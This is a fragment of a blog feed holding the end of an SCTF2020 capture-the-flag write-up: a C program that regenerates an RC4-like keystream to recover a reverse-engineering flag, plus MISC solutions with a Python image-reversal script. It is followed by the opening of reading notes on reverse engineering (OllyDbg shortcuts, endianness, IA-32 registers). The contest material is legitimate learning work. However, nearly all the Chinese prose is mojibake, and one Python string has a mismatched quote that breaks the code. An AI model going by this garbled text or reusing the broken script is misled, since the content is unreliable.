class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> od[<span class="number">256</span>] = &#123;<span class="number">0x00000031</span>, <span class="number">0x00000050</span>, <span class="number">0x00000052</span>, <span class="number">0x000000C1</span>, <span class="number">0x000000CD</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000039</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000004</span>, </span><br><span class="line"><span class="number">0x000000FD</span>, <span class="number">0x000000C4</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000072</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000060</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000BD</span>, <span class="number">0x000000E2</span>, <span class="number">0x00000061</span>, </span><br><span class="line"><span class="number">0x000000E4</span>, <span class="number">0x00000063</span>, <span class="number">0x000000EA</span>, <span class="number">0x000000FF</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000009</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000CE</span>, <span class="number">0x0000009E</span>, </span><br><span class="line"><span class="number">0x00000025</span>, <span class="number">0x0000006A</span>, <span class="number">0x0000004C</span>, <span class="number">0x000000DC</span>, <span class="number">0x00000013</span>, <span class="number">0x000000F0</span>, <span class="number">0x00000083</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000024</span>, <span class="number">0x000000DB</span>, </span><br><span class="line"><span class="number">0x000000DD</span>, <span class="number">0x0000007F</span>, <span class="number">0x000000EF</span>, <span class="number">0x0000008C</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000E1</span>, <span class="number">0x00000026</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000092</span>, <span class="number">0x00000006</span>, </span><br><span class="line"><span class="number">0x000000F7</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D0</span>, <span class="number">0x000000B4</span>, <span class="number">0x000000E7</span>, <span class="number">0x000000F8</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000078</span>, <span class="number">0x000000F2</span>, <span class="number">0x000000AA</span>, </span><br><span class="line"><span class="number">0x00000044</span>, <span class="number">0x00000032</span>, <span class="number">0x00000036</span>, <span class="number">0x0000005A</span>, <span class="number">0x000000EC</span>, <span class="number">0x000000A6</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000008</span>, <span class="number">0x000000C0</span>, <span class="number">0x0000002E</span>, </span><br><span class="line"><span class="number">0x0000009B</span>, <span class="number">0x00000084</span>, <span class="number">0x00000055</span>, <span class="number">0x0000009C</span>, <span class="number">0x000000AE</span>, <span class="number">0x00000065</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000053</span>, <span class="number">0x00000088</span>, </span><br><span class="line"><span class="number">0x00000049</span>, <span class="number">0x00000046</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000059</span>, <span class="number">0x0000007E</span>, <span class="number">0x000000E5</span>, <span class="number">0x000000B3</span>, <span class="number">0x000000F6</span>, </span><br><span class="line"><span class="number">0x00000048</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000D1</span>, <span class="number">0x000000A4</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006B</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000087</span>, <span class="number">0x00000073</span>, <span class="number">0x0000004B</span>, </span><br><span class="line"><span class="number">0x000000A2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000018</span>, <span class="number">0x000000D4</span>, <span class="number">0x000000BB</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000070</span>, <span class="number">0x00000093</span>, <span class="number">0x000000AC</span>, </span><br><span class="line"><span class="number">0x0000000F</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000051</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000021</span>, <span class="number">0x00000085</span>, <span class="number">0x00000045</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000009F</span>, </span><br><span class="line"><span class="number">0x00000081</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000095</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000016</span>, <span class="number">0x000000D2</span>, <span class="number">0x000000C7</span>, <span class="number">0x000000E0</span>, <span class="number">0x000000DA</span>, </span><br><span class="line"><span class="number">0x00000058</span>, <span class="number">0x000000A9</span>, <span class="number">0x0000001E</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C2</span>, <span class="number">0x00000069</span>, <span class="number">0x00000071</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000075</span>, </span><br><span class="line"><span class="number">0x000000BC</span>, <span class="number">0x00000066</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000030</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000099</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000077</span>, <span class="number">0x00000041</span>, <span class="number">0x00000097</span>, </span><br><span class="line"><span class="number">0x00000022</span>, <span class="number">0x000000B8</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000D3</span>, <span class="number">0x00000047</span>, <span class="number">0x000000C6</span>, <span class="number">0x00000079</span>, <span class="number">0x00000014</span>, <span class="number">0x0000000B</span>, <span class="number">0x000000F4</span>, </span><br><span class="line"><span class="number">0x0000003F</span>, <span class="number">0x00000011</span>, <span class="number">0x0000002B</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000EE</span>, <span class="number">0x000000F3</span>, <span class="number">0x000000F5</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000A5</span>, <span class="number">0x00000086</span>, </span><br><span class="line"><span class="number">0x00000091</span>, <span class="number">0x000000BE</span>, <span class="number">0x0000008E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000E8</span>, <span class="number">0x000000E6</span>, <span class="number">0x000000B1</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000037</span>, <span class="number">0x000000D5</span>, </span><br><span class="line"><span class="number">0x000000FC</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000042</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000035</span>, <span class="number">0x000000C8</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000089</span>, </span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000003</span>, <span class="number">0x0000008A</span>, <span class="number">0x0000008D</span>, <span class="number">0x000000D8</span>, <span class="number">0x00000076</span>, <span class="number">0x000000CB</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000F1</span>, </span><br><span class="line"><span class="number">0x0000006C</span>, <span class="number">0x000000B9</span>, <span class="number">0x00000017</span>, <span class="number">0x00000064</span>, <span class="number">0x00000068</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000056</span>, <span class="number">0x00000029</span>, <span class="number">0x00000090</span>, <span class="number">0x000000ED</span>, </span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000D</span>, <span class="number">0x000000EB</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000A1</span>, <span class="number">0x00000094</span>, <span class="number">0x00000080</span>, <span class="number">0x000000C9</span>, <span class="number">0x0000007C</span>, <span class="number">0x000000B7</span>, </span><br><span class="line"><span class="number">0x00000028</span>, <span class="number">0x00000005</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000023</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000A0</span>, <span class="number">0x00000027</span>, <span class="number">0x00000098</span>, <span class="number">0x00000043</span>, <span class="number">0x0000007D</span>, </span><br><span class="line"><span class="number">0x000000BF</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000012</span>, <span class="number">0x00000034</span>, <span class="number">0x000000A8</span>, <span class="number">0x000000D9</span>, <span class="number">0x00000057</span>, <span class="number">0x00000033</span>, <span class="number">0x0000009A</span>, <span class="number">0x00000001</span>, </span><br><span class="line"><span class="number">0x00000054</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000062</span>, <span class="number">0x00000038</span>, <span class="number">0x000000FB</span>, <span class="number">0x00000082</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000019</span>, </span><br><span class="line"><span class="number">0x0000005D</span>, <span class="number">0x000000B6</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x000000CC</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x00000080</span>, <span class="number">0x00000055</span>, <span class="number">0x0000007E</span>, <span class="number">0x0000002D</span>, <span class="number">0x000000D1</span>, <span class="number">0x00000009</span>, <span class="number">0x00000025</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000056</span>, </span><br><span class="line"><span class="number">0x00000095</span>, <span class="number">0x000000C4</span>, <span class="number">0x00000036</span>, <span class="number">0x00000013</span>, <span class="number">0x000000ED</span>, <span class="number">0x00000072</span>, <span class="number">0x00000024</span>, <span class="number">0x00000093</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000C8</span>, </span><br><span class="line"><span class="number">0x00000045</span>, <span class="number">0x000000EC</span>, <span class="number">0x00000016</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000067</span>, <span class="number">0x0000001D</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D9</span>, </span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v6 = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v11 = (v11 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v10 = (*(od + v11) + v10) % <span class="number">256</span>;</span><br><span class="line">*(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v10) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    v6 = (*(od +  v10) + *(od +  v11)) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    temp = j;</span><br><span class="line">    temp ^= *(od +  v6);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(temp == a[i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<img src="/2020/07/10/SCTF2020/image-20200714153241364.png" alt="image-20200714153241364"></p><p>ä¸‹é¢ä½¿ç”¨idcpythonè„šæœ¬æ‰§è¡Œæ¥å¾—åˆ°æ”¹å†™çš„åŒºæ®µï¼Œé¦–å…ˆctrl+sæŸ¥çœ‹åŒºæ®µçš„é¦–åœ°å€ï¼š<img src="/2020/07/10/SCTF2020/image-20200714161123125.png" alt="image-20200714161123125"></p><p>shift+f2è¾“å…¥è¦æ‰§è¡Œçš„è„šæœ¬ï¼Œæ‰§è¡Œï¼š<img src="/2020/07/10/SCTF2020/image-20200714161222707.png" alt="image-20200714161222707"></p><p>å¾—åˆ°æ”¹å†™çš„æ•°æ®åï¼Œå…ˆuè®©æ•°æ®æœªå®šä¹‰ï¼Œå†pè½¬åŒ–ä¸ºå‡½æ•°ã€‚<img src="/2020/07/10/SCTF2020/image-20200714162237927.png" alt="image-20200714162237927"></p><p><strong>æ€»ç»“ï¼šå¤šçŒœæµ‹ï¼Œå¯¹æ•°æ®çš„æ•æ„Ÿæ€§ï¼Œè¿™é“é¢˜å¼€å§‹æƒ³åˆ°æ˜¯hashç®€å•å¾ˆå¤šã€‚</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><p>ç›´æ¥æŒ‚VPNè¿›å…¥æ‰€ç»™ç½‘å€ï¼š<img src="/2020/07/10/SCTF2020/image-20200720211239002.png" alt="image-20200720211239002"></p><h3 id="Easymisc"><a href="#Easymisc" class="headerlink" title="Easymisc"></a>Easymisc</h3><p>é™„ä»¶ä¸‹è½½åæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡åå­—æ˜¯å€’åºçš„ä¸”æ‰“ä¸å¼€ã€‚</p><p>æ‹–è¿›010editorå‘ç°jpgå›¾ç‰‡çš„å°¾å·´æ ¼å¼ä½†æ˜¯å€’åºçš„ï¼Œç»“åˆå›¾ç‰‡åå­—å¯ä»¥çŸ¥é“è¦å°†å›¾ç‰‡çš„ä¿¡æ¯å€’åºï¼Œè¿™é‡Œæ³¨æ„æ˜¯æˆå¯¹çš„å€’åºè¿˜æ˜¯ä¸€ä¸ªä¸€ä¸ªå€’åºã€‚<img src="/2020/07/10/SCTF2020/image-20200720212540806.png" alt="image-20200720212540806"></p><p>å¤åˆ¶å‡ºæ•°æ®çš„åå…­è¿›åˆ¶æ ¼å¼ï¼Œå†™pythonè„šæœ¬å€’åºå†™å…¥æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">s = <span class="string">'å¤åˆ¶çš„å›¾ç‰‡çš„äºŒè¿›åˆ¶ä¿¡æ¯â€˜</span></span><br><span class="line"><span class="string">s = s[::-1]</span></span><br><span class="line"><span class="string">with open('</span>flag.jpg<span class="string">', "wb") as f:</span></span><br><span class="line"><span class="string">    for i in range(0, len(s), 2):</span></span><br><span class="line"><span class="string">        n = s[i]+s[i+1]</span></span><br><span class="line"><span class="string">        ans = struct.pack('</span>B<span class="string">', int(n, 16))</span></span><br><span class="line"><span class="string">        f.write(ans)</span></span><br><span class="line"><span class="string">f.close()</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°é€†åºåçš„æ–‡ä»¶ï¼Œè¡¥é½jpgå›¾ç‰‡çš„æ–‡ä»¶å¤´åæ‰“å¼€å›¾ç‰‡ï¼š<img src="/2020/07/10/SCTF2020/image-20200720213434806.png" alt="image-20200720213434806">f</p><p>å‘ç°ä¸å¯¹ï¼Œçœ‹çœ‹å›¾ç‰‡å±æ€§ï¼š<img src="/2020/07/10/SCTF2020/image-20200720213644954.png" alt="image-20200720213644954"></p><p>æœ€åè½½å…¥010editorå‘ç°æ›´å¤šçš„ä¿¡æ¯ï¼š<img src="/2020/07/10/SCTF2020/image-20200720213808864.png" alt="image-20200720213808864"></p><p>æœ€åæ‰¾åœ¨çº¿ç½‘ç«™è¿›è¡Œrc4è§£å¯†ï¼š<img src="/2020/07/10/SCTF2020/image-20200720213948350.png" alt="image-20200720213948350"></p><h3 id="doudizhu"><a href="#doudizhu" class="headerlink" title="doudizhu"></a>doudizhu</h3><p>ç›´æ¥ç©æ¸¸æˆé€šå…³ï¼Œæœ‰æ¸¸æˆä½“éªŒã€‚ã€‚å“ˆå“ˆ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°</title>
      <link href="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>PSï¼šæœ¬ä¹¦å°†æŒ‡å¼•ä½ è¿›å…¥ç¾å¦™åˆåˆºæ¿€çš„ä»£ç é€†å‘åˆ†æä¸–ç•Œï¼Œå¼€å¯ä¸€æ®µç¥å¥‡ä¹‹æ—…ï¼</strong><a id="more"></a></p><h2 id="ç¬¬äºŒç« -é€†å‘åˆ†æ-Hello-World-ç¨‹åº"><a href="#ç¬¬äºŒç« -é€†å‘åˆ†æ-Hello-World-ç¨‹åº" class="headerlink" title="ç¬¬äºŒç«  é€†å‘åˆ†æ Hello World!ç¨‹åº"></a>ç¬¬äºŒç«  é€†å‘åˆ†æ Hello World!ç¨‹åº</h2><h3 id="ODå¸¸ç”¨å¿«æ·é”®"><a href="#ODå¸¸ç”¨å¿«æ·é”®" class="headerlink" title="ODå¸¸ç”¨å¿«æ·é”®"></a>ODå¸¸ç”¨å¿«æ·é”®</h3><ul><li>æ‰§è¡Œåˆ°è¿”å›ï¼šctrl+F9</li></ul><ul><li>é‡æ–°å¼€å§‹ï¼šctrl+F2</li></ul><ul><li>æ‰§è¡Œåˆ°å…‰æ ‡å¤„ï¼šF4</li></ul><ul><li>ç¼–è¾‘æ•°æ®ï¼šctrl+E</li></ul><ul><li>ç¼–å†™æ±‡ç¼–ä»£ç ï¼šç©ºæ ¼</li></ul><ul><li>æ³¨é‡Šï¼šï¼›</li></ul><ul><li>è®¾ç½®æ ‡ç­¾ï¼šï¼š</li></ul><h3 id="è®¾ç½®ç¨‹åºå¤§æœ¬è¥"><a href="#è®¾ç½®ç¨‹åºå¤§æœ¬è¥" class="headerlink" title="è®¾ç½®ç¨‹åºå¤§æœ¬è¥"></a>è®¾ç½®ç¨‹åºå¤§æœ¬è¥</h3><p>1.å…ˆå¯¹æ‰€è¦è®¾ç½®çš„è¯­å¥è®¾ç½®ä¸€ä¸ªæ ‡ç­¾ï¼Œå†é€šè¿‡æŸ¥çœ‹å·²ç»è®¾ç½®çš„æ ‡ç­¾æ‰¾åˆ°ã€‚åŒæ—¶æ ‡ç­¾å¯ä»¥è®©ä»£ç å˜å¾—éå¸¸ç›´è§‚ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701143813355.png" alt="image-20200701143813355"></p><p>2.ä¸æ ‡ç­¾ç›¸åŒçš„æ–¹æ³•ï¼Œåªä¸è¿‡ä½¿ç”¨ ï¼›ï¼Œå†æŸ¥çœ‹å·²ç»è®¾ç½®çš„æ³¨é‡Šã€‚</p><p>3.è®¾ç½®æ–­ç‚¹ã€‚</p><p>4.ä½¿ç”¨å‘½ä»¤è·³è½¬å‘½ä»¤ï¼šctrl+G</p><h3 id="å¿«é€ŸæŸ¥æ‰¾æŒ‡å®šä»£ç "><a href="#å¿«é€ŸæŸ¥æ‰¾æŒ‡å®šä»£ç " class="headerlink" title="å¿«é€ŸæŸ¥æ‰¾æŒ‡å®šä»£ç "></a>å¿«é€ŸæŸ¥æ‰¾æŒ‡å®šä»£ç </h3><p>1.APIæ£€ç´¢æ³•ï¼ˆ1ï¼‰ï¼šåœ¨è°ƒç”¨ä»£ç ä¸­è®¾ç½®æ–­ç‚¹ã€‚</p><ul><li>åœ¨äº‹å…ˆæ¨æµ‹å‡ºä»£ç è¦ä½¿ç”¨APIåï¼Œé¼ æ ‡å³é”®èœå•-æŸ¥æ‰¾-æ‰€æœ‰æ¨¡å—é—´ä¹‹é—´çš„è°ƒç”¨ã€‚æ‰¾åˆ°æŒ‡å®šå‡½æ•°ååŒå‡»æŸ¥çœ‹ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701144638966.png" alt="image-20200701144638966"></li></ul><p>2.APIæ£€ç´¢æ³•ï¼ˆ2ï¼‰ï¼šåœ¨APIä»£ç ä¸­è®¾ç½®æ–­ç‚¹ã€‚</p><ul><li>é¼ æ ‡å³é”®èœå•-æŸ¥æ‰¾-æ‰€æœ‰æ¨¡å—åç§°ï¼Œåˆ—å‡ºè¢«åŠ è½½çš„DLLæ–‡ä»¶ä¸­æä¾›çš„æ‰€æœ‰APIã€‚æ‰¾åˆ°å‡½æ•°ï¼Œè¿›å…¥ä¸‹æ–­ç‚¹ï¼ŒF9æ‰§è¡Œï¼Œåœ¨è¯¥å‡½æ•°åœä¸‹åï¼Œä½¿ç”¨ctrl+F9æ‰§è¡Œåˆ°retï¼Œæœ€åF7å›åˆ°è¢«è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡è¯­å¥å¤„ã€‚</li></ul><hr><h2 id="ç¬¬ä¸‰ç« -å°ç«¯åºæ ‡è®°æ³•"><a href="#ç¬¬ä¸‰ç« -å°ç«¯åºæ ‡è®°æ³•" class="headerlink" title="ç¬¬ä¸‰ç«  å°ç«¯åºæ ‡è®°æ³•"></a>ç¬¬ä¸‰ç«  å°ç«¯åºæ ‡è®°æ³•</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><ul><li><p>å­—èŠ‚åºï¼šå¤šå­—èŠ‚æ•°æ®åœ¨è®¡ç®—æœºå†…å­˜ä¸­å­˜å‚¨æˆ–ç½‘ç»œä¼ è¾“æ—¶å„å­—èŠ‚çš„å­˜å‚¨é¡ºåºã€‚ä¸»è¦äºŒå¤§ç±»ï¼šå¤§ç«¯ä¸å°ç«¯ã€‚</p></li><li><p>å¤§ç«¯ï¼šé«˜åœ°å€å­˜æ”¾æ•°æ®çš„ä½ä½ï¼Œä½åœ°å€å­˜æ”¾æ•°æ®çš„é«˜ä½ã€‚</p></li><li><p>å°ç«¯ï¼šé«˜åœ°å€å­˜æ”¾æ•°æ®çš„é«˜ä½ï¼Œä½åœ°å€å­˜æ”¾æ•°æ®çš„åœ°ä½ã€‚</p></li></ul><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><ul><li>å¤§ç«¯åºå¸¸ç”¨äºå¤§å‹UNIXæœåŠ¡å™¨çš„RISCç³»åˆ—çš„CPUä¸ç½‘ç»œä¼ è¾“åè®®ä¸­ã€‚</li><li>å°ç«¯åºï¼ŒIntel x86 Cpué‡‡ç”¨çš„åºåˆ—ã€‚</li></ul><hr><h2 id="ç¬¬å››ç« -IA-32å¯„å­˜å™¨åŸºæœ¬è¯¦è§£"><a href="#ç¬¬å››ç« -IA-32å¯„å­˜å™¨åŸºæœ¬è¯¦è§£" class="headerlink" title="ç¬¬å››ç«  IA-32å¯„å­˜å™¨åŸºæœ¬è¯¦è§£"></a>ç¬¬å››ç«  IA-32å¯„å­˜å™¨åŸºæœ¬è¯¦è§£</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å¯„å­˜å™¨ï¼šCPUå†…éƒ¨ç”¨æ¥å­˜æ”¾æ•°æ®çš„ä¸€äº›å°å‹å­˜å‚¨åŒºåŸŸã€‚å®ƒé›†æˆåœ¨CPUå†…éƒ¨ï¼Œæ‹¥æœ‰éå¸¸é«˜çš„è¯»å†™é€Ÿåº¦ã€‚</p><h3 id="åŸºæœ¬ç¨‹åºè¿è¡Œå¯„å­˜å™¨"><a href="#åŸºæœ¬ç¨‹åºè¿è¡Œå¯„å­˜å™¨" class="headerlink" title="åŸºæœ¬ç¨‹åºè¿è¡Œå¯„å­˜å™¨"></a>åŸºæœ¬ç¨‹åºè¿è¡Œå¯„å­˜å™¨</h3><p>1.é€šç”¨å¯„å­˜å™¨ï¼ˆ32ä½ 8ä¸ªï¼‰ï¼šEAXï¼ŒEBXï¼ŒECXï¼ŒEDXï¼ŒESIï¼ŒEDIï¼ŒEBPï¼ŒESP</p><p><strong>psï¼šä¸ºäº†å®ç°å¯¹ä½16ä½å¯„å­˜å™¨çš„å…¼å®¹ï¼Œå„å¯„å­˜å™¨åˆå¯åˆ†ä¸ºé«˜ï¼šHï¼ˆhighï¼‰ï¼Œä½ï¼ˆLï¼šlowï¼‰å‡ ä¸ªç‹¬ç«‹çš„å¯„å­˜å™¨ã€‚</strong></p><ul><li>EAXï¼šï¼ˆ0-31ï¼‰32ä½</li><li>AXï¼šï¼ˆ0-15ï¼‰EAXçš„ä½16ä½</li><li>AHï¼šï¼ˆ8-15ï¼‰AXçš„é«˜8ä½</li><li>ALï¼šï¼ˆ0-7ï¼‰AXçš„ä½8ä½</li></ul><p>EAXï¼šï¼ˆé’ˆå¯¹æ“ä½œæ•°å’Œç»“æœæ•°æ®çš„ï¼‰ç´¯åŠ å™¨</p><p>EBXï¼šï¼ˆDSæ®µä¸­çš„æ•°æ®æŒ‡é’ˆï¼‰åŸºå€å¯„å­˜å™¨</p><p>ECXï¼šï¼ˆå­—ç¬¦ä¸²å’Œå¾ªç¯æ“ä½œçš„ï¼‰è®¡æ•°å™¨</p><p>EDXï¼šï¼ˆI/OæŒ‡é’ˆï¼‰æ•°æ®å¯„å­˜å™¨</p><p><strong>psï¼šä»¥ä¸Š4ä¸ªå¯„å­˜å™¨ä¸»è¦ç”¨åœ¨ç®—æœ¯è¿ç®—ä¹‹è·¯ä¸­ï¼Œå¸¸å¸¸ç”¨äºä¿å­˜å¸¸é‡ä¸å˜é‡çš„å€¼ï¼ŒEAXä¸€èˆ¬ç”¨åœ¨å‡½æ•°è¿”å›å€¼ä¸­ã€‚</strong></p><p>EBPï¼šï¼ˆSSæ®µä¸­æ ˆå†…æ•°æ®æŒ‡é’ˆï¼‰æ‹“å±•åŸºå€æŒ‡é’ˆå¯„å­˜å™¨</p><p>ESIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œæºæŒ‡é’ˆï¼‰æºå˜å€å¯„å­˜å™¨</p><p>EDIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œç›®æ ‡æŒ‡é’ˆï¼‰ç›®çš„å˜å€å¯„å­˜å™¨</p><p>ESPï¼šï¼ˆSSæ®µä¸­æ ˆæŒ‡é’ˆï¼‰æ ˆæŒ‡é’ˆå¯„å­˜å™¨</p><p><strong>psï¼šä»¥ä¸Šå››ä¸ªå¯„å­˜å™¨å¸¸ç”¨ä½œä¿å­˜å†…å­˜åœ°å€çš„æŒ‡é’ˆã€‚</strong></p><p>2.æ®µå¯„å­˜å™¨ï¼ˆ16ä½ 6ä¸ªï¼‰ï¼šCSï¼ŒDSï¼ŒSSï¼ŒESï¼ŒFSï¼ŒGS</p><ul><li><p>CSï¼šä»£ç æ®µå¯„å­˜å™¨</p></li><li><p>SSï¼šæ ˆæ®µå¯„å­˜å™¨</p></li><li><p>DSï¼šæ•°æ®æ®µå¯„å­˜å™¨</p></li><li><p>ESï¼šé™„åŠ æ•°æ®æ®µå¯„å­˜å™¨</p></li><li><p>FSï¼šæ•°æ®æ®µå¯„å­˜å™¨</p></li><li><p>GSï¼šæ•°æ®æ®µå¯„å­˜å™¨</p></li></ul><p>3.ç¨‹åºçŠ¶æ€ä¸æ§åˆ¶å¯„å­˜å™¨ï¼šELFLAGSå¯„å­˜å™¨çš„æ¯ä½éƒ½æœ‰æ„ä¹‰ï¼Œæ¯ä½çš„å€¼ä¸º0æˆ–1ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701190155792.png" 